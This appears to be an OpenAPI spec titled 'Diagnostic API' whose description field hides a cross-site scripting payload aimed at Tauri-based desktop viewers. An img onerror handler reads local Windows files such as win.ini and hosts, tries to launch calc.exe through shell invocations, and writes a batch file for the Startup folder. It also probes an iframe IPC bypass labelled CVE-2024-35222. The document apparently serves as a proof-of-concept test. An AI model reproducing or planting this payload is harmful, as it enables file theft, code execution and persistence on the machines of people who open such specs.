openapi: "3.0.0"
info:
  title: "Diagnostic API"
  version: "1.0.0"
  description: |
    RCE test.
    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 4: Asset read + invoke + startup) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,250))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,150))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,150));next()}}r.push('convertFileSrc type: '+typeof t.convertFileSrc);r.push('');add('convertFileSrc win.ini + fetch',function(){var u=t.convertFileSrc('C:\\Windows\\win.ini');r.push('  asset URL: '+u);return fetch(u).then(function(x){return x.text()}).then(function(txt){r.push('  FILE READ SUCCESS ('+txt.length+' bytes):');r.push('  '+txt.substring(0,200));return 'READ OK'})});add('convertFileSrc hosts + fetch',function(){var u=t.convertFileSrc('C:\\Windows\\System32\\drivers\\etc\\hosts');r.push('  asset URL: '+u);return fetch(u).then(function(x){return x.text()}).then(function(txt){r.push('  FILE READ ('+txt.length+' bytes):');r.push('  '+txt.substring(0,200));return 'READ OK'})});add('asset URL direct fetch',function(){return fetch('https://asset.localhost/C%3A%5CWindows%5Cwin.ini').then(function(x){r.push('  status: '+x.status);return x.text()}).then(function(txt){r.push('  content: '+txt.substring(0,100));return 'status ok'})});add('invoke __tauriModule Shell open',function(){return t.tauri.invoke('tauri',{__tauriModule:'Shell',message:{cmd:'open',path:'C:\\Windows\\System32\\calc.exe'}})});add('invoke __tauriModule Shell execute',function(){return t.tauri.invoke('tauri',{__tauriModule:'Shell',message:{cmd:'execute',program:'calc',args:[]}})});add('dialog.save to Startup folder',function(){var s='C:\\Users\\'+location.hostname+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat';return t.dialog.save({defaultPath:'update-helper.bat'}).then(function(p){if(!p)return Promise.reject('cancelled');r.push('  path: '+p);return t.fs.writeTextFile(p,'@echo off\r\ncalc.exe\r\n').then(function(){r.push('  WRITE OK');return 'written to: '+p})})});add('iframe IPC bypass (CVE-2024-35222)',function(){return new Promise(function(ok,fail){var f=document.createElement('iframe');f.style.display='none';f.srcdoc='<html><body></body></html>';document.body.appendChild(f);setTimeout(function(){try{var tw=f.contentWindow.__TAURI__;if(tw){r.push('  iframe has __TAURI__: YES');r.push('  iframe shell: '+(tw.shell?Object.keys(tw.shell).join(','):'N/A'));ok('VULN - iframe has Tauri IPC')}else{r.push('  iframe __TAURI__: undefined');ok('not vulnerable')}}catch(e){fail(e)}},500)})});next()})()">
servers:
  - url: "https://api.example.com/v1"
paths:
  /test:
    get:
      operationId: runTest
      summary: "Run test"
      parameters:
        - name: id
          in: query
          required: true
          schema:
            type: string
      responses:
        "200":
          description: "OK"
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:
                    type: string
